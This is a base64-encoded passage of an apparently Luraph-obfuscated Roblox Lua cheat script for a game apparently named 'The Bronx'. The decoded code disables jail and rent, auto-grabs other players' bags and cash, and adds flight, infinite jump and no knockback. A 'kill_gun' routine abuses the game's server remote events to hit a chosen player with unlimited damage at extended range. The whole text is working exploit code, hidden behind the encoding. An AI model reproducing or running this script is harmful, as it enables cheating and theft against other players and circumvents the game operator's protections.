CAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkZhbGxEYW1hZ2VSYWdkb2xsIikuRGlzYWJsZWQgPSBDb25maWcuVGhlQnJvbnguUGxheWVyTW9kaWZpY2F0aW9ucy5Ob0ZhbGxEYW1hZ2UKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiQmxvb2RHdWkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJCbG9vZEd1aSIpLkVuYWJsZWQgPSBub3QgQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnNbIkRpc2FibGVCbG9vZEVmZmVjdHMiXQogICAgICAgICAgICAgICAgZW5kICAgICAgICAgICAKCiAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5QbGF5ZXJHdWk6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYVRleHRzIikgYW5kIExvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhVGV4dHMiKTpGaW5kRmlyc3RDaGlsZCgiTG9jYWxTY3JpcHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmFUZXh0cyIpLkVuYWJsZWQgPSBub3QgQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnMuRGlzYWJsZUphaWwKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWk6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYVRleHRzIikuTG9jYWxTY3JpcHQuRGlzYWJsZWQgPSBDb25maWcuVGhlQnJvbnguUGxheWVyTW9kaWZpY2F0aW9ucy5EaXNhYmxlSmFpbAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJSZW50R3VpIikgYW5kIExvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiUmVudEd1aSIpOkZpbmRGaXJzdENoaWxkKCJMb2NhbFNjcmlwdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWk6RmluZEZpcnN0Q2hpbGQoIlJlbnRHdWkiKS5Mb2NhbFNjcmlwdC5EaXNhYmxlZCA9IENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJNb2RpZmljYXRpb25zLk5vUmVudFBheQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnMuQXV0b1BpY2t1cEJhZ3MgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gbmV4dCwgV29ya3NwYWNlLlN0b3JhZ2U6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgVmFsdWU6SXNBKCJNZXNoUGFydCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlOkZpbmRGaXJzdENoaWxkKCJQbGF5ZXJOYW1lIikgYW5kIFZhbHVlOkZpbmRGaXJzdENoaWxkKCJQbGF5ZXJOYW1lIikuVmFsdWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVmFsdWUuUG9zaXRpb24gLSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbikuTWFnbml0dWRlIDwgNSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFZhbHVlLnN0ZWFscHJvbXB0KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJNb2RpZmljYXRpb25zLkF1dG9QaWNrdXBDYXNoIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIG5leHQsIFdvcmtzcGFjZS5Eb2xsYXM6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgVmFsdWU6SXNBKCJQYXJ0IikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFZhbHVlLlBvc2l0aW9uIC0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZSA8IDUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChWYWx1ZS5Qcm94aW1pdHlQcm9tcHQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBDb25maWcuVGhlQnJvbnguUGxheWVyTW9kaWZpY2F0aW9ucy5EaXNhYmxlSmFpbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgTGlnaHRpbmcuU2hpZXN0eTpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJSZW1vdGVFdmVudCIsIHRydWUpOkZpcmVTZXJ2ZXIoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0QmVnYW46Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihJbnB1dCwgR2FtZV9FdmVudCkKICAgICAgICAgICAgICAgIGlmIEdhbWVfRXZlbnQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLk1pc2NTZXR0aW5ncy5Nb2RpZnlKdW1wLkluZmluaXR5IHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgICAgIGlmIElucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlNwYWNlIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLkhlYWx0aCB+PSAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuSnVtcGluZykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgbG9jYWwgRGVhdGhGcmFtZTsKCiAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKS5EaWVkOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIERlYXRoRnJhbWUgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikuQ0ZyYW1lCiAgICAgICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5EZXNjZW5kYW50QWRkZWQ6Q29ubmVjdChmdW5jdGlvbihEZXNjZW5kYW50KQogICAgICAgICAgICAgICAgICAgIGlmIERlc2NlbmRhbnQ6SXNBKCJCb2R5VmVsb2NpdHkiKSBvciBEZXNjZW5kYW50OklzQSgiTGluZWFyVmVsb2NpdHkiKSBvciBEZXNjZW5kYW50OklzQSgiVmVjdG9yRm9yY2UiKSBhbmQgQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnMuTm9Lbm9ja2JhY2sgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKTsgRGVzY2VuZGFudDpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKENoYXJhY3RlcikKICAgICAgICAgICAgICAgIENoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIik7IENoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKTsKCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oRGVzY2VuZGFudCkKICAgICAgICAgICAgICAgICAgICBpZiBEZXNjZW5kYW50OklzQSgiQm9keVZlbG9jaXR5Iikgb3IgRGVzY2VuZGFudDpJc0EoIkxpbmVhclZlbG9jaXR5Iikgb3IgRGVzY2VuZGFudDpJc0EoIlZlY3RvckZvcmNlIikgYW5kIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJNb2RpZmljYXRpb25zLk5vS25vY2tiYWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCk7IERlc2NlbmRhbnQ6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKS5EaWVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIERlYXRoRnJhbWUgPSBDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikuQ0ZyYW1lCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnMuUmVzcGF3bldoZXJlWW91RGllZCBhbmQgdHlwZW9mKERlYXRoRnJhbWUpID09ICJDRnJhbWUiIHRoZW4KICAgICAgICAgICAgICAgICAgICBDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikuQ0ZyYW1lID0gRGVhdGhGcmFtZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBsb2NhbCBLRVlDT0RFUyA9IHsKICAgICAgICAgICAgICAgIFtFbnVtLktleUNvZGUuV10gPSB0cnVlLAogICAgICAgICAgICAgICAgW0VudW0uS2V5Q29kZS5BXSA9IHRydWUsCiAgICAgICAgICAgICAgICBbRW51bS5LZXlDb2RlLlNdID0gdHJ1ZSwKICAgICAgICAgICAgICAgIFtFbnVtLktleUNvZGUuRF0gPSB0cnVlLAogICAgICAgICAgICAgICAgW0VudW0uS2V5Q29kZS5MZWZ0Q29udHJvbF0gPSB0cnVlLAogICAgICAgICAgICAgICAgW0VudW0uS2V5Q29kZS5TcGFjZV0gPSB0cnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGxvY2FsIGlucHV0X2tleXMgPSB7fQogICAgICAgICAgICBsb2NhbCBmbGlnaHRfcmVnaXN0cnkgPSB7fQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gRnVuY3Rpb25zCiAgICAgICAgICAgIGxvY2FsIGlzS2V5c1ByZXNzZWQgPSBmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICBsb2NhbCBrZXlzID0gey4uLn0KICAgICAgICAgICAgICAgIGZvciBpID0gMSwgI2tleXMgZG8KICAgICAgICAgICAgICAgICAgICBpZiBpbnB1dF9rZXlzW2tleXNbaV1dIHRoZW4gcmV0dXJuIDEgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHJldHVybiAwCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZ2V0RmxpZ2h0RGlyZWN0aW9uID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcmV0dXJuIFZlY3RvcjMubmV3KAogICAgICAgICAgICAgICAgICAgIGlzS2V5c1ByZXNzZWQoRW51bS5LZXlDb2RlLkQpIC0gaXNLZXlzUHJlc3NlZChFbnVtLktleUNvZGUuQSksCiAgICAgICAgICAgICAgICAgICAgaXNLZXlzUHJlc3NlZChFbnVtLktleUNvZGUuU3BhY2UpIC0gaXNLZXlzUHJlc3NlZChFbnVtLktleUNvZGUuTGVmdENvbnRyb2wpLAogICAgICAgICAgICAgICAgICAgIGlzS2V5c1ByZXNzZWQoRW51bS5LZXlDb2RlLlMpIC0gaXNLZXlzUHJlc3NlZChFbnVtLktleUNvZGUuVykKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBTdGFydEZsaWdodCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAgQ29uZmlnLlRoZUJyb254LkZseSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KAogICAgICAgICAgICAgICAgICAgICAgICBmbGlnaHRfcmVnaXN0cnksCiAgICAgICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2UuU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKHQsIGR0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHJvb3Qgb3Igbm90IGh1bWFub2lkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5GcmVlZmFsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZlbG9jaXR5ID0gZ2V0RmxpZ2h0RGlyZWN0aW9uKCkgKiBDb25maWcuVGhlQnJvbnguRmx5LmhpeiAqIGR0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkZyZWVmYWxsKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcG9zaXRpb24sIG9yaWVudGF0aW9uID0gQ0ZyYW1lLm5ldyhyb290LlBvc2l0aW9uKSwgQ0ZyYW1lLmZyb21FdWxlckFuZ2xlc1hZWihDYW1lcmEuQ0ZyYW1lOlRvRXVsZXJBbmdsZXNYWVooKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuRnJlZWZhbGwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LkNGcmFtZSA9IHBvc2l0aW9uICogb3JpZW50YXRpb24gKiBDRnJhbWUubmV3KHZlbG9jaXR5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5GcmVlZmFsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5GcmVlZmFsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQXNzZW1ibHlBbmd1bGFyVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuRnJlZWZhbGwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5GcmVlZmFsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkZyZWVmYWxsKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChmbGlnaHRfcmVnaXN0cnksIGZ1bmN0aW9uKCkgcm9vdC5BbmNob3JlZCA9IGZhbHNlIGVuZCkKICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoZmxpZ2h0X3JlZ2lzdHJ5LCBmdW5jdGlvbigpIGh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSBmYWxzZSBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgUmVzZXRGbGlnaHQgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgaSx2IGluIGZsaWdodF9yZWdpc3RyeSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHQgPSB0eXBlb2YodikKICAgICAgICAgICAgICAgICAgICBpZiB0ID09ICJSQlhTY3JpcHRDb25uZWN0aW9uIiB0aGVuIHY6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHQgPT0gIkluc3RhbmNlIiB0aGVuIHY6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHQgPT0gImZ1bmN0aW9uIiB0aGVuIHRhc2suc3Bhd24odikgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGZsaWdodF9yZWdpc3RyeSA9IHt9CiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIE9uQ2hhcmFjdGVyID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oY2hhcmFjdGVyOiBNb2RlbCkKICAgICAgICAgICAgICAgIHJvb3QgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIGh1bWFub2lkID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQoKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5UaGVCcm9ueC5GbHkuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgUnVuU2VydmljZS5TdGVwcGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgIFN0YXJ0RmxpZ2h0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgT25JbnB1dEJlZ2FuID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oaW5wdXQ6IElucHV0T2JqZWN0LCBnYW1lUHJvY2Vzc2VkRXZlbnQ6IGJvb2xlYW4pCiAgICAgICAgICAgICAgICBpZiBnYW1lUHJvY2Vzc2VkRXZlbnQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlIH49IEVudW0uVXNlcklucHV0VHlwZS5LZXlib2FyZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIGtleWNvZGUgPSBpbnB1dC5LZXlDb2RlCiAgICAgICAgICAgICAgICBpZiBLRVlDT0RFU1trZXljb2RlXSB0aGVuIGlucHV0X2tleXNba2V5Y29kZV0gPSB0cnVlIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBPbklucHV0RW5kZWQgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihpbnB1dDogSW5wdXRPYmplY3QpCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlIH49IEVudW0uVXNlcklucHV0VHlwZS5LZXlib2FyZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIGtleWNvZGUgPSBpbnB1dC5LZXlDb2RlCiAgICAgICAgICAgICAgICBpZiBLRVlDT0RFU1trZXljb2RlXSB0aGVuIGlucHV0X2tleXNba2V5Y29kZV0gPSBmYWxzZSBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgT25DYW1lcmEgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBDYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYSBvciBDYW1lcmEKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4gdGFzay5zcGF3bihPbkNoYXJhY3RlciwgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSBlbmQKICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChPbkNoYXJhY3RlcikKICAgICAgICAgICAgVXNlcklucHV0U2VydmljZS5JbnB1dEJlZ2FuOkNvbm5lY3QoT25JbnB1dEJlZ2FuKQogICAgICAgICAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0RW5kZWQ6Q29ubmVjdChPbklucHV0RW5kZWQpCiAgICAgICAgICAgIFdvcmtzcGFjZS5DaGFuZ2VkOkNvbm5lY3QoT25DYW1lcmEpCgogICAgICAgICAgICBsb2NhbCBraWxsX2d1biA9IExQSF9KSVRfTUFYKGZ1bmN0aW9uKHRhcmdldDogc3RyaW5nLCBocGFydDogc3RyaW5nLCBkYW1hZ2U6IG51bWJlcikgCiAgICAgICAgICAgICAgICBpZiBub3QgaHBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGhwYXJ0ID0gImhlYWQiCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBub3QgZGFtYWdlIHRoZW4KICAgICAgICAgICAgICAgICAgICBkYW1hZ2UgPSBtYXRoLmh1Z2UKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgWyJ0b29sIl0gPSBQbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRvb2wiKSwKICAgICAgICAgICAgICAgICAgICBbInRhcmdldCJdID0gUGxheWVyc1t0YXJnZXRdLAogICAgICAgICAgICAgICAgICAgIFsiaGl0cG9zIl0gPSBQbGF5ZXJzW3RhcmdldF0uQ2hhcmFjdGVyW2hwYXJ0XS5Qb3NpdGlvbiwKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiBub3QgcmF3Z2V0KGRhdGEsICJ0b29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgUmVxdWlyZVN1cHBvcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIHJlcXVpcmUocmF3Z2V0KGRhdGEsICJ0b29sIikuU2V0dGluZykuUmFuZ2UgPSAxMDAwMAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuVmlzdWFsaXplTXV6emxlOkZpcmVTZXJ2ZXIodGFibGUudW5wYWNrKHsKICAgICAgICAgICAgICAgICAgICByYXdnZXQoZGF0YSwgInRvb2wiKS5IYW5kbGUsCiAgICAgICAgICAgICAgICAgICAgdHJ1ZSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZhbHNlLAogICAgICAgICAgICAgICAgICAgICAgICA3LAogICAgICAgICAgICAgICAgICAgICAgICBDb2xvcjMubmV3KDEsIDEuMTA5ODAzOTE1MDIzOCwgMCksCiAgICAgICAgICAgICAgICAgICAgICAgIDE1LAogICAgICAgICAgICAgICAgICAgICAgICB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAwLjAyCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICByYXdnZXQoZGF0YSwgInRvb2wiKS5HdW5TY3JpcHRfTG9jYWwuTXV6emxlRWZmZWN0CiAgICAgICAgICAgICAgICB9KSkKCiAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5WaXN1YWxpemVCdWxsZXQ6RmlyZVNlcnZlcih0YWJsZS51bnBhY2soewogICAgICAgICAgICAgICAgICAgIHJhd2dldChkYXRhLCAidG9vbCIpLAogICAgICAgICAgICAgICAgcmF3Z2V0KGRhdGEsICJ0b29sIikuSGFuZGxlLAogICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0wLjE3NzQ2OTA1OTgyNDk0LCAwLjA4ODczMTEyNDk5NzEzOSwgMC45ODAxMTgwMzYyNzAxNCksCiAgICAgICAgICAgICAgICAgICAgcmF3Z2V0KGRhdGEsICJ0b29sIikuSGFuZGxlLkd1bkZpcmVQb2ludCwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDExMjEzOTY3NzkwNzYwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDkyOTc3MjI4MjA0NDA4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTEyMTM5Njc3OTA3NjAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgOTI5NzcyMjgyMDQ0MDgKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgMSwKICAgICAgICAgICAgICAgICAgICAgICAgMSwKICAgICAgICAgICAgICAgICAgICAgICAgMTAsCiAgICAgICAgICAgICAgICAgICAgICAgIHJhd2dldChkYXRhLCAidG9vbCIpLkd1blNjcmlwdF9Mb2NhbC5IaXRFZmZlY3QsCiAgICAgICAgICAgICAgICAgICAgICAgIHRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAwCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIDEsCiAgI